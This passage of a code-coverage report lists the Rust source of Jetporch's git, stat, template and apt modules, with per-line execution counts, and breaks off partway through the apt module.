request.changes.contains(\u0026Field::Branch) {\n                    self.switch_branch(handle, request)?;\n                }\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n\n            // no passive or execute leg\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        \n        }\n    }\n}\n\nimpl GitAction {\n\n    // BOOKMARK: fleshing this all out... \n\n    fn is_ssh_repo(\u0026self) -\u003e bool {\n        let result = self.repo.find(\"@\").is_some() || self.repo.find(\"ssh://\").is_some();\n        return result;\n    }\n\n    fn get_ssh_options_string(\u0026self) -\u003e String {\n        let options = self.ssh_options.join(\" \");\n        if self.path.starts_with(\"http\") {\n            // http or https:// passwords are intentionally not supported, use a key instead, see docs\n            return String::from(\"GIT_TERMINAL_PROMPT=0\");\n        }\n        else {\n            let accept_keys = match self.accept_keys {\n                true  =\u003e String::from(\" -o StrictHostKeyChecking=accept-new\"),\n                false =\u003e String::from(\"\")\n            };\n            return format!(\"GIT_SSH_COMMAND=\\\"ssh {}{}\\\" GIT_TERMINAL_PROMPT=0\", options, accept_keys);\n        }\n    }\n\n    fn get_local_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cOption\u003cString\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"git -C {} rev-parse HEAD\", self.path);\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n        if rc == 0 {\n            return Ok(Some(out.replace(\"\\n\",\"\")));\n        } else {\n            return Ok(None);\n        }\n    }\n\n    fn get_remote_version(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        let ssh_options = self.get_ssh_options_string();\n        let cmd = format!(\"{} git ls-remote {} | head -n 1 | cut -f 1\", ssh_options, self.repo);\n        let result = match self.is_ssh_repo() {\n            true  =\u003e handle.remote.run_forwardable(request, \u0026cmd, CheckRc::Checked)?,\n            false =\u003e handle.remote.run_unsafe(\u0026request, \u0026cmd, CheckRc::Checked)?\n        };\n        let (_rc, out) = cmd_info(\u0026result);\n        return Ok(out);\n    }\n    \n\n    fn pull(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let ssh_options = self.get_ssh_options_string();\n        let cmd = format!(\"{} git -C {} pull\", ssh_options, self.path);\n        match self.is_ssh_repo() {\n            true  =\u003e handle.remote.run_forwardable(request, \u0026cmd, CheckRc::Checked)?,\n            false =\u003e handle.remote.run_unsafe(\u0026request, \u0026cmd, CheckRc::Checked)?\n        };\n        return Ok(());\n    }\n\n    fn get_local_branch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"git -C {} rev-parse --abbrev-ref HEAD\", self.path);\n        let result = handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Checked)?;\n        let (_rc, out) = cmd_info(\u0026result);\n        return Ok(out);\n    }\n\n    fn clone(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        let ssh_options = self.get_ssh_options_string();\n        handle.remote.create_directory(request, \u0026self.path)?;\n        let cmd = format!(\"{} git clone {} {}\", ssh_options, self.repo, self.path);\n        match self.is_ssh_repo() {\n            true =\u003e  handle.remote.run_forwardable(request, \u0026cmd, CheckRc::Checked)?,\n            false =\u003e handle.remote.run_unsafe(\u0026request, \u0026cmd, CheckRc::Checked)?\n        };\n        return Ok(());\n    }\n\n    fn switch_branch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"git -C {} switch {}\", self.path, self.branch);\n        handle.remote.run_unsafe(request, \u0026cmd, CheckRc::Checked)?;\n        return Ok(());\n    }\n\n}\n// TODO: agent forwarding flag used by SSH connections\n// + make stuff work\n// + testing ssh and http repos without passwords\n// branch changes \n// etc","traces":[{"line":55,"address":[],"length":0,"stats":{"Line":2}},{"line":56,"address":[],"length":0,"stats":{"Line":1}},{"line":57,"address":[],"length":0,"stats":{"Line":1}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":158,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":170,"address":[],"length":0,"stats":{"Line":0}},{"line":174,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":223,"address":[],"length":0,"stats":{"Line":0}},{"line":224,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":232,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":239,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":253,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":258,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":108},{"path":["/","Users","wings","projects","jetpack","src","modules","files","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod copy;\npub mod directory;\npub mod file;\npub mod git;\npub mod stat;\npub mod template;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","files","stat.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - JetPorch Project Contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::{tasks::*};\nuse crate::handle::handle::TaskHandle;\nuse serde::{Deserialize, Serialize};\nuse std::sync::{Arc};\n\nconst MODULE: \u0026str = \"stat\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct StatTask {\n    pub name: Option\u003cString\u003e,\n    pub path: String,\n    pub save: String,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\n#[allow(dead_code)]\nstruct StatAction {\n    pub path: String,\n    pub save: String,\n}\n\nimpl IsTask for StatTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(StatAction {\n                    path: handle.template.path(\u0026request, tm, \u0026String::from(\"path\"), \u0026self.path)?,\n                    save: handle.template.string_no_spaces(\u0026request, tm, \u0026String::from(\"save\"), \u0026self.save)?,\n                }),\n                with: Arc::new(PreLogicInput::template(handle, request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(handle, request, tm, \u0026self.and)?),\n            }\n        );\n    }\n}\n\nimpl IsAction for StatAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                let stat = stat_file(handle, request, \u0026self.path)?;\n                save_results(handle, request, \u0026self.save, stat)?;\n                return Ok(handle.response.is_passive(request));\n            },\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n\n    }\n\n}\n\n#[derive(Serialize)]\nstruct StatResult {\n    pub exists: bool,\n    pub is_dir: bool,\n    pub mode: Option\u003cString\u003e,\n    pub owner: Option\u003cString\u003e,\n    pub group: Option\u003cString\u003e,\n}\n\nconst DOESNT_EXIST: StatResult = StatResult{\n    exists: false,\n    is_dir: false,\n    mode: None,\n    owner: None,\n    group: None,\n};\n\nfn stat_file(handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, path: \u0026String) -\u003e Result\u003cStatResult, Arc\u003cTaskResponse\u003e\u003e {\n    let mode_option = handle.remote.get_mode(request, path)?;\n    match mode_option {\n        Some(mode) =\u003e {\n            let is_dir = handle.remote.get_is_directory(request, path)?;\n            let ownership = handle.remote.get_ownership(request, path)?;\n            if ownership.is_some() {\n                // we can add other properties here, such as file+directory size, including contents, SELinux attributes, etc\n                // return None for the ones that are not supported\n                let (owner, group) = ownership.unwrap();\n                return Ok(StatResult{\n                    exists: true,\n                    is_dir: is_dir,\n                    mode: Some(format!(\"0o{}\", mode)),\n                    owner: Some(owner),\n                    group: Some(group),\n                })\n            }\n            else {\n                // file was seemingly deleted between two command executions above, should basically never happen\n                return Ok(DOESNT_EXIST);\n            }\n        },\n        // file didn't exist the first time we were looking for it\n        None =\u003e Ok(DOESNT_EXIST),\n    }\n}\n\nfn save_results(handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e, key: \u0026String, stat: StatResult) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n    let mut result = serde_yaml::Mapping::new();\n    // the following statement really can't fail.\n    let value = serde_yaml::to_value(stat).expect(\"internal error: failed to unwrap stat\");\n    result.insert(serde_yaml::Value::String(key.clone()), value);\n    handle.host.write().unwrap().update_variables(result);\n    Ok(())\n}","traces":[{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":1}},{"line":44,"address":[],"length":0,"stats":{"Line":1}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":40},{"path":["/","Users","wings","projects","jetpack","src","modules","files","template.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::checksum::sha512;\nuse crate::tasks::fields::Field;\nuse std::path::{PathBuf};\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\nuse crate::tasks::files::Recurse;\n\nconst MODULE: \u0026str = \"template\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct TemplateTask {\n    pub name: Option\u003cString\u003e,\n    pub src: String,\n    pub dest: String,\n    pub attributes: Option\u003cFileAttributesInput\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct TemplateAction {\n    pub src: PathBuf,\n    pub dest: String,\n    pub attributes: Option\u003cFileAttributesEvaluated\u003e,\n}\n\nimpl IsTask for TemplateTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        let src = handle.template.string(\u0026request, tm, \u0026String::from(\"src\"), \u0026self.src)?;\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(TemplateAction {\n                    src:        handle.template.find_template_path(request, tm, \u0026String::from(\"src\"), \u0026src)?,\n                    dest:       handle.template.path(\u0026request, tm, \u0026String::from(\"dest\"), \u0026self.dest)?,\n                    attributes: FileAttributesInput::template(\u0026handle, \u0026request, tm, \u0026self.attributes)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for TemplateAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                let remote_mode = handle.remote.query_common_file_attributes(request, \u0026self.dest, \u0026self.attributes, \u0026mut changes, Recurse::No)?;                   \n                if remote_mode.is_none() {\n                    return Ok(handle.response.needs_creation(request));\n                }\n                let data = self.do_template(handle, request, false, None)?;\n                let local_512 = sha512(\u0026data);\n                let remote_512 = handle.remote.get_sha512(request, \u0026self.dest)?;\n                if ! remote_512.eq(\u0026local_512) { \n                    changes.push(Field::Content); \n                }\n                if ! changes.is_empty() {\n                    return Ok(handle.response.needs_modification(request, \u0026changes));\n                }\n                return Ok(handle.response.is_matched(request));\n            },\n\n            TaskRequestType::Create =\u003e {\n                self.do_template(handle, request, true, None)?;               \n                return Ok(handle.response.is_created(request));\n            }\n\n            TaskRequestType::Modify =\u003e {\n                if request.changes.contains(\u0026Field::Content) {\n                    self.do_template(handle, request, true, Some(request.changes.clone()))?;\n                }\n                else {\n                    handle.remote.process_common_file_attributes(request, \u0026self.dest, \u0026self.attributes, \u0026request.changes, Recurse::No)?;\n                }\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            }\n    \n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n    \n        }\n    }\n\n}\n\nimpl TemplateAction {\n\n    pub fn do_template(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, write: bool, _changes: Option\u003cVec\u003cField\u003e\u003e) -\u003e Result\u003cString, Arc\u003cTaskResponse\u003e\u003e {\n        let template_contents = handle.local.read_file(\u0026request, \u0026self.src)?;\n        let data = handle.template.string_for_template_module_use_only(\u0026request, TemplateMode::Strict, \u0026String::from(\"src\"), \u0026template_contents)?;\n        if write {\n            handle.remote.write_data(\u0026request, \u0026data, \u0026self.dest, |f| { /* after save */\n                match handle.remote.process_all_common_file_attributes(request, \u0026f, \u0026self.attributes, Recurse::No) {\n                    Ok(_x) =\u003e Ok(()), Err(y) =\u003e Err(y)\n                }\n            })?;\n        }\n        return Ok(data);\n    }\n\n}\n","traces":[{"line":48,"address":[],"length":0,"stats":{"Line":2}},{"line":49,"address":[],"length":0,"stats":{"Line":1}},{"line":50,"address":[],"length":0,"stats":{"Line":1}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":39},{"path":["/","Users","wings","projects","jetpack","src","modules","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULE CATEGORIES HERE, KEEP ALPHABETIZED **/\n\npub mod access;\npub mod commands;\npub mod control;\npub mod files;\npub mod packages;\npub mod services;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","packages","apt.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::modules::packages::common::{PackageManagementModule,PackageDetails};\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse serde::{Deserialize};\nuse std::sync::Arc;\n\nconst MODULE: \u0026str = \"apt\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct AptTask {\n    pub name: Option\u003cString\u003e,\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub remove: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct AptAction {\n    pub package: String,\n    pub version: Option\u003cString\u003e,\n    pub update: bool,\n    pub remove: bool,\n}\n\nimpl IsTask for AptTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(AptAction {\n                    package:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"package\"), \u0026self.package)?,\n                    version:    handle.template.string_option_no_spaces(\u0026request, tm, \u0026String::from(\"version\"), \u0026self.version)?,\n                    update:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?)\n            }\n        );\n    }\n\n}\n\nimpl IsAction for AptAction {\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n        return self.common_dispatch(handle,request);\n    }\n}\n\nimpl PackageManagementModule for AptAction {\n\n    fn initial_setup(\u0026self, _handle: \u0026Arc\u003cTaskHandle\u003e, _request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003c(),Arc\u003cTaskResponse\u003e\u003e {\n        // nothing to do here, see how this was used in yum_dnf.rs\n        return Ok(());\n    }\n\n    fn is_update(\u0026self) -\u003e bool {\n        return self.update;\n    }\n\n    fn is_remove(\u0026self) -\u003e bool {\n        return self.remove; 